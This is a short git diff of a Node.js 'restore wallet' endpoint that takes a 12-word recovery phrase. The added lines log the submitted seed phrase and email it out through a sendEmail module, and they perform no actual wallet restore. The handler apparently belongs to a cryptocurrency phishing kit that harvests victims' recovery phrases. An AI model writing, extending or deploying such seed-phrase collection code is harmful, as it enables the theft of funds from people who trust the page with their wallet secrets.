@@ -1,4 +1,5 @@
 const restorWalletValidationSchema = require("../validation/restoreWallet");
+const sendEmail = require("../emails/restoreWallet");
 
 module.exports = async (req, res) => {
   try {
@@ -6,6 +7,7 @@ module.exports = async (req, res) => {
 
     // 12 word key-phrase
     if (type === "12") {
+      // Validate inputss
       const restoreWalletValid = restorWalletValidationSchema.validate(
         req.body
       );
@@ -16,6 +18,13 @@ module.exports = async (req, res) => {
           alert: { status: "error", message: restoreWalletValid.error.message },
         });
       }
+
+      delete req.body.checkbox;
+      console.log(req.body);
+
+      // Send email
+      const sentMail = await sendEmail(req.body, type);
+      console.log(sentMail);
     }
     res.json(req.body);
   } catch (error) {
